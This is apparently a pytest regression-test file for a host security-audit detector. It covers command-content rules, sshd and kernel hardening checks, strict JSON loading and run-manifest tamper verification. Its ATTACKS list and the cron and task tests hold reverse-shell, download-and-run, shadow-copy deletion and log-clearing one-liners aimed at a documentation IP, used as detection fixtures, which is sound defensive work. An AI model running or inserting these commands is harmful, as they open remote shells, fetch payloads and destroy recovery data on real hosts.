"""Regression tests for the audit remediation (P1-P3): rule layer, strict loading, manifests.

Every test reproduces one defect with the record shapes the collectors emit, or pins a negative
case that must stay quiet. Synthetic data only; nothing here touches the network or a host.
"""

from __future__ import annotations

import hashlib
import json
import time
from pathlib import Path
from typing import Any

import pytest
from baseline_builders import cov, rec, report
from test_detection import NOW, one, reports, rules_for, run

from shared.reporting import detect as detect_cli
from shared.reporting import diff as diff_cli
from shared.reporting import verify as verify_cli
from shared.reporting.accepted import AllowlistError, load
from shared.reporting.baseline import compare
from shared.reporting.detection import RULES, command_reasons
from shared.reporting.inventory import (
    Options,
    ReportError,
    build_snapshot,
    is_loopback_address,
    load_snapshot,
)
from shared.reporting.jsonio import JsonInputError, load_json_strict
from shared.reporting.manifest import verify_run_dir

RULE_IDS = frozenset(r.rule_id for r in RULES)

# ------------------------------------------------ BO-EXE-002: command content (P1-1, P1-2)

ATTACKS = [
    "bash -i >& /dev/tcp/203.0.113.9/9001 0>&1",
    "nc -lvp 4444 -e /bin/sh",
    "ncat --exec /bin/sh 203.0.113.9 9001",
    "ncat -l 9001 --sh-exec /bin/bash",
    "socat TCP:203.0.113.9:9001 SYSTEM:/bin/sh",
    "nc 203.0.113.9 4444 | /bin/sh",
    "/bin/sh -i 2>&1 | nc 203.0.113.9 9001",
    "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.0.113.9 9 >/tmp/f",
    "curl -s http://203.0.113.9/a.sh | sh",
    "wget -qO- http://203.0.113.9/a | bash",
    "bash <(curl -s http://203.0.113.9/a.sh)",
    "echo YmFzaA== | base64 -d | sh",
    "python3 -c 'import socket,os'",
    "perl -MIO -e '$p=fork;exit,if($p);'",
    "python3 -c 'import pty;pty.spawn(\"/bin/sh\")'",
    "export LD_PRELOAD=/usr/lib/x.so",
    "alias sudo=/tmp/fake",
    "chmod u+s /tmp/x",
    "powershell.exe -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAA==",
    "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')",
    "mshta.exe http://203.0.113.9/a.hta",
    "regsvr32 /s /n /u /i:http://203.0.113.9/a.sct scrobj.dll",
    "certutil -urlcache -f http://203.0.113.9/a.exe a.exe",
    "vssadmin delete shadows /all /quiet",
    "wevtutil cl Security",
]
BENIGN = [
    "/usr/local/bin/backup.sh --full",
    "nc -z db1 5432",
    "ncat -l 8080",
    "curl -sSf http://example.test/health -o /dev/null",
    "curl -s http://example.test | tar xz",
    "diff <(ls a) <(ls b)",
    "python3 /opt/app/run.py --port 8000",
    "/usr/bin/perl /usr/share/lintian/x.pl",
    "powershell.exe -NoProfile -File C:\\Program Files\\Acme\\task.ps1",
    "C:\\Windows\\System32\\wevtutil.exe qe Security /c:5",
    "chmod 755 /usr/local/bin/tool",
    "telnet localhost 25",
    "sudo /usr/sbin/service nginx reload",
]


@pytest.mark.parametrize("command", ATTACKS)
def test_attack_command_is_labelled(command: str) -> None:
    assert command_reasons(command), command


@pytest.mark.parametrize("command", BENIGN)
def test_ordinary_command_is_not_labelled(command: str) -> None:
    assert command_reasons(command) == [], (command, command_reasons(command))


def test_pattern_scan_is_bounded_on_adversarial_text() -> None:
    """Command text is attacker-influenced: ~2000 characters of near-matches must stay fast."""
    nasty = ("nc " * 600) + "x" * 200
    nasty2 = "curl " + "a|" * 900
    nasty3 = ("sh -i " * 300) + "|" + " " * 300
    started = time.monotonic()
    for text in (nasty, nasty2, nasty3, "iex" * 700, "x" * 100_000):
        command_reasons(text)
    assert time.monotonic() - started < 2.0


def test_cron_reverse_shell_is_high_and_a_plain_job_is_not_exe002() -> None:
    def job(cmd: str) -> dict[str, Any]:
        return rec(
            "scheduled_tasks",
            "cron:/etc/cron.d/j#1",
            {"entry": f"* * * * * root {cmd}"},
            scope="cron",
        )

    bad = run([], [job("bash -i >& /dev/tcp/203.0.113.9/9001 0>&1")])
    assert one(bad, "cron:/etc/cron.d/j#1")["severity"] == "high"
    assert "BO-EXE-002" in rules_for(bad, "cron:/etc/cron.d/j#1")
    good = run([], [job("/usr/local/bin/backup.sh")])
    assert "BO-EXE-002" not in rules_for(good, "cron:/etc/cron.d/j#1")
    assert one(good, "cron:/etc/cron.d/j#1")["severity"] == "medium"


def test_an_existing_attack_command_is_not_re_reported_and_a_changed_one_is() -> None:
    def job(cmd: str) -> dict[str, Any]:
        return rec("scheduled_tasks", "task:\\t", {"command": cmd}, scope="tasks")

    same = job("powershell -c IEX (iwr http://203.0.113.9/a)")
    assert run([same], [same])["detections"] == []
    changed = run([job("C:\\ok.exe")], [same])
    assert "BO-EXE-002" in rules_for(changed, "task:\\t")


# -------------------------------------------- privileged primary groups, SSH-key linking


def test_new_account_with_an_admin_primary_group_is_caught_by_grp001() -> None:
    def sudo(pm: list[str]) -> dict[str, Any]:
        return rec("groups", "group:sudo", {"gid": "27", "members": [], "primary_members": pm})

    doc = run([sudo([])], [sudo(["ops"])])
    det = one(doc, "group:sudo")
    assert "BO-GRP-001" in rules_for(doc, "group:sudo") and det["severity"] == "high"
    fresh = run(
        [sudo([]), rec("users", "user:alice", {"uid": "1000", "shell": "/bin/bash"})],
        [
            sudo(["mallory"]),
            rec("users", "user:alice", {"uid": "1000", "shell": "/bin/bash"}),
            rec("users", "user:mallory", {"uid": "1001", "gid": "27", "shell": "/bin/bash"}),
        ],
    )
    assert one(fresh, "group:sudo")["severity"] == "critical"  # created in the same window


def test_primary_member_removed_or_unchanged_is_quiet() -> None:
    def sudo(pm: list[str]) -> dict[str, Any]:
        return rec("groups", "group:sudo", {"gid": "27", "members": [], "primary_members": pm})

    assert run([sudo(["ops"])], [sudo(["ops"])])["detections"] == []
    assert run([sudo(["ops"])], [sudo([])])["detections"] == []


def test_the_same_ssh_key_under_several_accounts_is_linked_not_unrelated() -> None:
    def key(owner: str) -> dict[str, Any]:
        return rec(
            "persistence",
            f"persist:ssh-authkey:{owner}:abc123",
            {"owner": owner, "type": "ssh-ed25519", "file": "/root/.ssh/authorized_keys"},
            scope="ssh-authkeys",
        )

    doc = run([], [key("root"), key("toor"), key("mallory")])
    dets = doc["detections"]
    assert len(dets) == 3
    for d in dets:
        assert {c["key"] for c in d["correlated"]} == {
            x["subject"]["key"] for x in dets if x is not d
        }
    other = run(
        [],
        [
            key("root"),
            rec(
                "persistence",
                "persist:ssh-authkey:alice:zzz999",
                {"owner": "alice"},
                scope="ssh-authkeys",
            ),
        ],
    )
    assert all(not d["correlated"] for d in other["detections"])


# -------------------------------------------------- hash-only records gain a direction


def startup(sha: str, ids: list[str]) -> dict[str, Any]:
    return rec(
        "persistence",
        "persist:startup:/etc/rc.local",
        {"sha256": sha * 64, "mode": "755", "lines": str(len(ids)), "line_ids": ids},
        scope="startup",
    )


def test_changed_startup_file_states_how_many_lines_were_added_and_removed() -> None:
    doc = run([startup("a", ["l1", "l2"])], [startup("b", ["l1", "l3", "l4"])])
    det = one(doc, "persist:startup:/etc/rc.local")
    assert "2 line(s) added and 1 removed" in det["summary"]
    assert any("fingerprints" in u for u in det["unknown"])
    assert not any("restored" in u for u in det["unknown"])  # direction is known


def test_startup_file_with_only_removed_lines_keeps_the_generic_unknown() -> None:
    doc = run([startup("a", ["l1", "l2"])], [startup("b", ["l1"])])
    det = one(doc, "persist:startup:/etc/rc.local")
    assert "0 line(s) added and 1 removed" in det["summary"]
    assert det["severity"] == "high"  # unchanged: removal is not evidence of safety


def test_records_without_fingerprints_behave_as_before() -> None:
    old = rec("persistence", "persist:startup:/etc/rc.local", {"sha256": "a" * 64}, scope="startup")
    new = rec("persistence", "persist:startup:/etc/rc.local", {"sha256": "b" * 64}, scope="startup")
    det = one(run([old], [new]), "persist:startup:/etc/rc.local")
    assert "line(s) added" not in det["summary"] and det["unknown"]


# ------------------------------------------------------- new and extended config rules


def sysctl(name: str, v: str) -> dict[str, Any]:
    return rec("config", f"config:sysctl:{name}", {"value": v}, scope="sysctl")


@pytest.mark.parametrize(
    ("name", "before", "after", "severity"),
    [
        ("kernel.kptr_restrict", "1", "0", "medium"),
        ("kernel.yama.ptrace_scope", "1", "0", "medium"),
        ("kernel.dmesg_restrict", "1", "0", "low"),
        ("fs.suid_dumpable", "0", "1", "medium"),
    ],
)
def test_kernel_hardening_values_dropping_are_detected(
    name: str, before: str, after: str, severity: str
) -> None:
    det = one(run([sysctl(name, before)], [sysctl(name, after)]), f"config:sysctl:{name}")
    assert det["severity"] == severity


@pytest.mark.parametrize(
    ("name", "before", "after"),
    [
        ("kernel.kptr_restrict", "0", "2"),
        ("kernel.yama.ptrace_scope", "0", "1"),
        ("kernel.kptr_restrict", "2", "1"),
        ("fs.suid_dumpable", "1", "0"),
    ],
)
def test_kernel_hardening_values_improving_or_staying_safe_are_quiet(
    name: str, before: str, after: str
) -> None:
    assert run([sysctl(name, before)], [sysctl(name, after)])["detections"] == []


def test_restrictanonymous_does_not_match_the_sam_setting() -> None:
    base = "config:security:reg:hklm\\system\\currentcontrolset\\control\\lsa::"
    sam = rec("config", base + "restrictanonymoussam", {"value": "1"}, scope="security")
    sam0 = rec("config", base + "restrictanonymoussam", {"value": "0"}, scope="security")
    det = one(run([sam], [sam0]), base + "restrictanonymoussam")
    assert "SAM" in det["summary"]
    plain = rec("config", base + "restrictanonymous", {"value": "1"}, scope="security")
    plain0 = rec("config", base + "restrictanonymous", {"value": "0"}, scope="security")
    assert "SAM" not in one(run([plain], [plain0]), base + "restrictanonymous")["summary"]


def sshd(kw: str, v: str) -> dict[str, Any]:
    return rec("config", f"config:sshd:{kw}", {"value": v}, scope="sshd")


@pytest.mark.parametrize(
    ("kw", "before", "after", "severity"),
    [
        ("permitrootlogin", "prohibit-password", "yes", "high"),
        ("permitemptypasswords", "no", "yes", "high"),
        ("permituserenvironment", "no", "yes", "high"),
        ("authorizedkeysfile", ".ssh/authorized_keys", "/tmp/.k", "high"),
        ("authorizedkeyscommand", "none", "/usr/local/bin/keys", "high"),
        ("passwordauthentication", "no", "yes", "medium"),
    ],
)
def test_sshd_weakening_is_detected(kw: str, before: str, after: str, severity: str) -> None:
    det = one(run([sshd(kw, before)], [sshd(kw, after)]), f"config:sshd:{kw}")
    assert (det["severity"], det["basis"]) == (severity, "observed")


@pytest.mark.parametrize(
    ("kw", "before", "after"),
    [
        ("permitrootlogin", "yes", "no"),
        ("permitrootlogin", "yes", "prohibit-password"),
        ("authorizedkeysfile", "/tmp/.k", ".ssh/authorized_keys"),
        (
            "authorizedkeysfile",
            ".ssh/authorized_keys",
            ".ssh/authorized_keys .ssh/authorized_keys2",
        ),
        ("authorizedkeysfile", ".ssh/authorized_keys", "none"),
        ("authorizedkeyscommand", "/usr/local/bin/keys", "none"),
        ("passwordauthentication", "yes", "no"),
        ("permituserenvironment", "yes", "no"),
        ("x11forwarding", "no", "yes"),
    ],
)
def test_sshd_hardening_or_unrelated_changes_are_quiet(kw: str, before: str, after: str) -> None:
    assert run([sshd(kw, before)], [sshd(kw, after)])["detections"] == []


def test_new_explicit_sshd_directive_that_is_weak_is_detected_when_added() -> None:
    assert rules_for(run([], [sshd("permitrootlogin", "yes")]), "config:sshd:permitrootlogin") == {
        "BO-CFG-008"
    }
    assert run([], [sshd("permitrootlogin", "no")])["detections"] == []


def kmod(name: str, taint: str = "none") -> dict[str, Any]:
    return rec("config", f"config:kmod:{name}", {"taint": taint}, scope="kmod")


def test_kernel_module_severity_follows_taint_and_removal_is_quiet() -> None:
    assert one(run([], [kmod("ext4")]), "config:kmod:ext4")["severity"] == "low"
    assert one(run([], [kmod("rk", "OE")]), "config:kmod:rk")["severity"] == "medium"
    assert one(run([], [kmod("rk", "O")]), "config:kmod:rk")["severity"] == "medium"
    assert run([kmod("ext4")], [])["detections"] == []
    assert run([kmod("ext4")], [kmod("ext4")])["detections"] == []


def fw(policy: str, rules: str) -> dict[str, Any]:
    return rec(
        "config",
        "config:firewall:linux-iptables",
        {"policy_input": policy, "rules": rules, "sha256": policy + rules},
        scope="firewall",
    )


@pytest.mark.parametrize(
    ("before", "after"), [(("DROP", "5"), ("ACCEPT", "5")), (("DROP", "5"), ("DROP", "0"))]
)
def test_linux_firewall_opening_is_detected(
    before: tuple[str, str], after: tuple[str, str]
) -> None:
    det = one(run([fw(*before)], [fw(*after)]), "config:firewall:linux-iptables")
    assert det["severity"] == "high"


@pytest.mark.parametrize(
    ("before", "after"),
    [
        (("ACCEPT", "0"), ("ACCEPT", "0")),
        (("ACCEPT", "0"), ("DROP", "3")),
        (("DROP", "5"), ("DROP", "6")),
    ],
)
def test_linux_firewall_unchanged_or_tightened_is_quiet(
    before: tuple[str, str], after: tuple[str, str]
) -> None:
    doc = run([fw(*before)], [fw(*after)])
    assert "BO-CFG-010" not in {r["rule"] for d in doc["detections"] for r in d["reasons"]}


def test_pam_module_hash_change_is_a_pam_detection() -> None:
    def mod(sha: str) -> dict[str, Any]:
        return rec(
            "config",
            "config:pam-module:/lib/security/pam_unix.so",
            {"sha256": sha * 64, "mode": "644"},
            scope="pam",
        )

    det = one(run([mod("a")], [mod("b")]), "config:pam-module:/lib/security/pam_unix.so")
    assert det["severity"] == "high" and "PAM module" in det["title"]
    assert run([mod("a")], [mod("a")])["detections"] == []


# ----------------------------------------------------------------------- loopback parsing


@pytest.mark.parametrize(
    "addr",
    ["127.0.0.1", "127.255.255.254", "::1", "localhost", "[::1]", "::ffff:127.0.0.1", "::1%lo"],
)
def test_loopback_forms(addr: str) -> None:
    assert is_loopback_address(addr)


@pytest.mark.parametrize(
    "addr",
    ["0.0.0.0", "::", "*", "10.0.0.1", "127.evil", "::1f00:1", "::ffff:10.0.0.1", "ipv6:ABCD", ""],
)
def test_non_loopback_forms(addr: str) -> None:
    assert not is_loopback_address(addr)


def test_listener_on_an_address_that_only_looks_like_loopback_is_exposed() -> None:
    def lst(bind: str) -> dict[str, Any]:
        return rec(
            "listeners",
            f"listener:tcp/{bind}/8080",
            {"proto": "tcp", "bind": bind, "port": "8080", "process": "java"},
        )

    assert "BO-NET-001" in rules_for(run([], [lst("::1f00:1")]), "listener:tcp/::1f00:1/8080")
    assert run([], [lst("::ffff:127.0.0.1")])["detections"] == []


# --------------------------------------------------------- one-sided attributes, test mode


def test_attribute_only_one_collector_version_records_is_not_an_unverified_value() -> None:
    old = rec("persistence", "persist:startup:/etc/rc.local", {"sha256": "a" * 64}, scope="startup")
    new = rec(
        "persistence",
        "persist:startup:/etc/rc.local",
        {"sha256": "a" * 64, "lines": "2", "line_ids": ["x", "y"]},
        scope="startup",
    )
    base, cur = reports([old], [new])
    diff = compare(build_snapshot(base, Options()), build_snapshot(cur, Options()), Options(), NOW)
    assert diff["indeterminate"] == [] and diff["changes"] == []
    codes = {w["code"] for w in diff["warnings"]}
    assert "ATTRIBUTES_NOT_COMPARED" in codes
    msg = next(w["message"] for w in diff["warnings"] if w["code"] == "ATTRIBUTES_NOT_COMPARED")
    assert "line_ids" in msg and "lines" in msg


def test_an_attribute_that_is_unknown_on_one_side_is_still_indeterminate() -> None:
    a = rec("users", "user:x", {"uid": "1", "password": None})
    b = rec("users", "user:x", {"uid": "1", "password": "set"})
    base, cur = reports([a], [b])
    diff = compare(build_snapshot(base, Options()), build_snapshot(cur, Options()), Options(), NOW)
    assert [i["reason"] for i in diff["indeterminate"]] == ["ATTRIBUTE_UNKNOWN"]


def test_comparing_a_fixture_report_warns() -> None:
    base, cur = reports([], [])
    cur["host"]["test_mode"] = True
    diff = compare(build_snapshot(base, Options()), build_snapshot(cur, Options()), Options(), NOW)
    assert any(w["code"] == "TEST_MODE" and "current" in w["message"] for w in diff["warnings"])
    clean = compare(
        build_snapshot(*reports([], [])[:1], Options()),
        build_snapshot(*reports([], [])[1:], Options()),
        Options(),
        NOW,
    )
    assert all(w["code"] != "TEST_MODE" for w in clean["warnings"])


# ----------------------------------------------------------------- strict JSON loading (P2-7)


def _write(tmp: Path, name: str, text: str) -> Path:
    p = tmp / name
    p.write_text(text, encoding="utf-8")
    return p


HOSTILE = {
    "deep": "[" * 200_000 + "]" * 200_000,
    "dup": '{"kind": "x", "kind": "y"}',
    "nan": '{"a": NaN}',
    "inf": '{"a": Infinity}',
    "truncated": '{"a": [1, 2',
}


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_loader_turns_hostile_json_into_a_clean_error(tmp_path: Path, name: str) -> None:
    p = _write(tmp_path, f"{name}.json", HOSTILE[name])
    with pytest.raises(JsonInputError, match="cannot read"):
        load_json_strict(p, 1 << 20, "input")


def test_loader_rejects_oversize_bad_utf8_and_missing(tmp_path: Path) -> None:
    big = _write(tmp_path, "big.json", '{"a": "' + "x" * 100 + '"}')
    with pytest.raises(JsonInputError, match="exceed the limit"):
        load_json_strict(big, 50, "input")
    bad = tmp_path / "bad.json"
    bad.write_bytes(b'{"a": "\xff\xfe"}')
    with pytest.raises(JsonInputError, match="UTF-8"):
        load_json_strict(bad, 1 << 20, "input")
    with pytest.raises(JsonInputError, match="cannot read"):
        load_json_strict(tmp_path / "missing.json", 10, "input")


def test_loader_accepts_a_bom_and_returns_the_exact_bytes(tmp_path: Path) -> None:
    p = tmp_path / "bom.json"
    p.write_bytes(b'\xef\xbb\xbf{"a": 1}')
    parsed, raw = load_json_strict(p, 100, "input")
    assert parsed == {"a": 1} and raw == b'\xef\xbb\xbf{"a": 1}'


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_detect_from_diff_rejects_hostile_json_with_exit_3_and_no_output(
    tmp_path: Path, capsys: pytest.CaptureFixture[str], name: str
) -> None:
    p = _write(tmp_path, "d.json", HOSTILE[name])
    code = detect_cli.main(["--from-diff", str(p), "--json", "--quiet"])
    out = capsys.readouterr()
    assert code == 3 and out.out == "" and "Traceback" not in out.err


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_allowlist_and_config_reject_hostile_json(
    tmp_path: Path, capsys: pytest.CaptureFixture[str], name: str
) -> None:
    p = _write(tmp_path, "x.json", HOSTILE[name])
    with pytest.raises(AllowlistError, match="cannot read"):
        load(str(p), RULE_IDS)
    a = _write(tmp_path, "a.json", "{}")
    b = _write(tmp_path, "b.json", "{}")
    assert diff_cli.main([str(a), str(b), "--config", str(p), "--quiet"]) == 3
    assert "Traceback" not in capsys.readouterr().err


def test_oversized_keys_in_a_saved_diff_are_rejected(
    tmp_path: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    base, cur = reports(
        [rec("users", "user:x", {"uid": "1"})], [rec("users", "user:y", {"uid": "2"})]
    )
    diff = compare(build_snapshot(base, Options()), build_snapshot(cur, Options()), Options(), NOW)
    diff["changes"][0]["key"] = "x" * 100_000
    p = _write(tmp_path, "d.json", json.dumps(diff))
    assert detect_cli.main(["--from-diff", str(p), "--json", "--quiet"]) == 3
    assert capsys.readouterr().out == ""


# --------------------------------------------------------------- run manifests (P2-1)


def make_run_dir(tmp: Path, **over: Any) -> Path:
    rd = tmp / "run"
    rd.mkdir()
    rep = report([rec("users", "user:root", {"uid": "0"})], run="run-xyz")
    files = {
        "report.json": json.dumps(rep).encode(),
        "report.txt": b"human report\n",
        "run.log": b"log\n",
    }
    for name, data in files.items():
        (rd / name).write_bytes(data)
    manifest: dict[str, Any] = {
        "schema_version": "0.1.0",
        "kind": "run-manifest",
        "hash_algorithm": "sha256",
        "complete": True,
        "tool": {"name": "audit-linux", "version": "0.1.0"},
        "run": {"id": "run-xyz", "started_at": NOW, "finished_at": NOW, "exit_code": 0},
        "host": {"hostname": "h"},
        "files": [
            {"path": n, "sha256": hashlib.sha256(d).hexdigest(), "size": len(d)}
            for n, d in files.items()
        ],
        "collector": [],
    }
    manifest.update(over)
    (rd / "manifest.json").write_text(json.dumps(manifest), encoding="utf-8")
    return rd


def test_intact_run_directory_verifies_and_loads(tmp_path: Path) -> None:
    rd = make_run_dir(tmp_path)
    assert verify_run_dir(rd) == []
    assert load_snapshot(rd).meta.run_id == "run-xyz"


def test_modified_report_is_refused_by_verify_and_by_loading(tmp_path: Path) -> None:
    rd = make_run_dir(tmp_path)
    data = json.loads((rd / "report.json").read_text())
    data["inventory"]["records"] = []  # an attacker hides every record
    (rd / "report.json").write_text(json.dumps(data))
    problems = verify_run_dir(rd)
    assert any("report.json" in p and "SHA-256" in p for p in problems)
    with pytest.raises(ReportError, match="manifest verification"):
        load_snapshot(rd)


@pytest.mark.parametrize(
    "mutate",
    [
        lambda rd: (rd / "run.log").write_bytes(b"x"),
        lambda rd: (rd / "report.txt").unlink(),
        lambda rd: (rd / "extra.txt").write_text("planted"),
    ],
)
def test_changed_missing_or_planted_files_are_reported(tmp_path: Path, mutate: Any) -> None:
    rd = make_run_dir(tmp_path)
    mutate(rd)
    assert verify_run_dir(rd)


def test_symlink_in_place_of_a_report_file_is_refused(tmp_path: Path) -> None:
    rd = make_run_dir(tmp_path)
    real = tmp_path / "elsewhere.txt"
    real.write_bytes((rd / "report.txt").read_bytes())
    (rd / "report.txt").unlink()
    (rd / "report.txt").symlink_to(real)
    assert any("report.txt" in p for p in verify_run_dir(rd))


@pytest.mark.parametrize(
    "over",
    [
        {"complete": False},
        {"hash_algorithm": "md5"},
        {"kind": "other"},
        {"files": []},
        {"files": [{"path": "../report.json", "sha256": "0" * 64, "size": 1}]},
        {"files": [{"path": "manifest.json", "sha256": "0" * 64, "size": 1}]},
        {"run": {"id": "someone-else"}},
    ],
)
def test_malformed_or_mismatching_manifests_are_problems(
    tmp_path: Path, over: dict[str, Any]
) -> None:
    rd = make_run_dir(tmp_path, **over)
    assert verify_run_dir(rd)


def test_rewritten_manifest_is_caught_with_the_off_host_digest(tmp_path: Path) -> None:
    rd = make_run_dir(tmp_path)
    kept = hashlib.sha256((rd / "manifest.json").read_bytes()).hexdigest()
    assert verify_run_dir(rd, kept) == []
    (rd / "report.txt").write_bytes(b"forged\n")
    m = json.loads((rd / "manifest.json").read_text())
    for f in m["files"]:  # the attacker also fixes the manifest
        if f["path"] == "report.txt":
            f["sha256"] = hashlib.sha256(b"forged\n").hexdigest()
            f["size"] = len(b"forged\n")
    (rd / "manifest.json").write_text(json.dumps(m))
    assert verify_run_dir(rd) == []  # self-consistent...
    assert any("expected digest" in p for p in verify_run_dir(rd, kept))  # ...but not the original
    assert any("not a SHA-256" in p for p in verify_run_dir(rd, "nothex"))


def test_verify_cli_exit_codes(tmp_path: Path, capsys: pytest.CaptureFixture[str]) -> None:
    rd = make_run_dir(tmp_path)
    assert verify_cli.main([str(rd)]) == 0
    assert "matches its manifest" in capsys.readouterr().out
    (rd / "run.log").write_bytes(b"tampered")
    assert verify_cli.main([str(rd)]) == 3
    assert "run.log" in capsys.readouterr().err
    assert verify_cli.main([str(tmp_path / "nope")]) == 3


def test_a_run_directory_without_a_manifest_loads_as_before(tmp_path: Path) -> None:
    rd = make_run_dir(tmp_path)
    (rd / "manifest.json").unlink()
    assert load_snapshot(rd).meta.run_id == "run-xyz"
    cov("users")  # builder import kept honest
